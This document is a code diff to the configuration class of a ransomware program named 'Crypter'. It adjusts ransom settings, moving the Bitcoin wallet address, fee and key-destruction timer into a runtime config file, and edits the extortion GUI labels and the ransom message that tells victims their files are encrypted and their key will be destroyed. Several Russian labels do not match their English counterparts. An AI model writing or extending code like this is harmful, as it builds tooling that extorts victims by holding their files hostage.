@@ -20,24 +20,23 @@ class Base():
     '''
 
     # CORE SCHEMA
-    ENCRYPTED_EXTENSION = ".locked"
     BLOCK_SIZE_BYTES = 8192
     IV_SIZE = 16
     PADDING_BLOCK_SIZE = 16
     MAX_FILE_SIZE_BYTES = 536870912
-    KEY_DESTRUCT_TIME_SECONDS = 259200
     REGISTRY_LOCATION = r"SOFTWARE\\Crypter"
-    WALLET_ADDRESS = "12mdKVNfAhLbRDLtRWQFhQgydgU6bUMjay"
-    BITCOIN_FEE = "0.5"
+    RUNTIME_CONFIG_FILE = "runtime.cfg"
+    BTC_BUTTON_URL = "https://www.coindesk.com/information/what-is-bitcoin/"
 
     # Get locale 
     if "ru" in locale.getdefaultlocale():
-        LANG = "ru"
+        #LANG = "ru"
+        LANG = "eng"
     else:
         LANG = "eng"
     
     # GUI SCHEMA
-    GUI_IMAGE_LOGO = "crypter_logo_small.bmp"
+    GUI_IMAGE_LOGO = "lock.bmp"
     GUI_LABEL_TEXT_TITLE = {
         "eng": "CRYPTER",
         "ru": u"КРИПТЕР"
@@ -50,20 +49,24 @@ class Base():
         "eng": "YOUR FILES HAVE BEEN DECRYPTED!",
         "ru": u"ВАШИ ФАЙЛЫ БЫЛИ РАСШИФРАНЫ!"
     }
-    GUI_LABEL_TEXT_KEY_DESTRUCTION = {
-        "eng": "KEY DESTRUCTION IN: ",
+    GUI_LABEL_TEXT_FLASHING_DESTROYED = {
+        "eng": "YOUR DECRYPTION KEY HAS BEEN DESTROYED!",
+        "ru": u"ВАШИ ФАЙЛЫ БЫЛИ РАСШИФРАНЫ!"
+    }
+    GUI_LABEL_TEXT_TIME_REMAINING = {
+        "eng": "TIME REMAINING",
         "ru": u"РАЗРУШЕНИЕ КЛЮЧА ЧЕРЕЗ: "
     }
     GUI_LABEL_TEXT_WALLET_ADDRESS = {
         "eng": "WALLET ADDRESS: ",
         "ru": u"АДРЕС КОШЕЛЬКА: "
     }
-    GUI_LABEL_TEXT_FILES_DECRYPTED = {
-        "eng": "FILES DECRYPTED",
-        "ru": u"ФАЙЛЫ РАСШИФРАНЫ"
+    GUI_LABEL_TEXT_BITCOIN_FEE = {
+        "eng": "BITCOIN FEE: ",
+        "ru": u"АДРЕС КОШЕЛЬКА: "
     }
-    GUI_LABEL_TEXT_KEY_DESTROYED = {
-        "eng": "KEY DESTROYED",
+    GUI_LABEL_TEXT_TIME_BLANK = {
+        "eng": "--------",
         "ru": u"KEY DESTROYED"
     }
     GUI_BUTTON_TEXT_VIEW_ENCRYPTED_FILES = {
@@ -99,6 +102,9 @@ class Base():
         "ru": u"A list of encrypted files was not found"
     }
     
+    '''
+    @note: Not currently being used because this needs to be defined at a later point
+    to bring in the runtime config settings
     GUI_RANSOM_MESSAGE = {
         "eng": (
           "The important files on your computer have been encrypted with"
@@ -125,6 +131,7 @@ class Base():
           (BITCOIN_FEE, (KEY_DESTRUCT_TIME_SECONDS / 60 / 60))
           )
         }
+    '''
                           
 
     FILETYPES = [
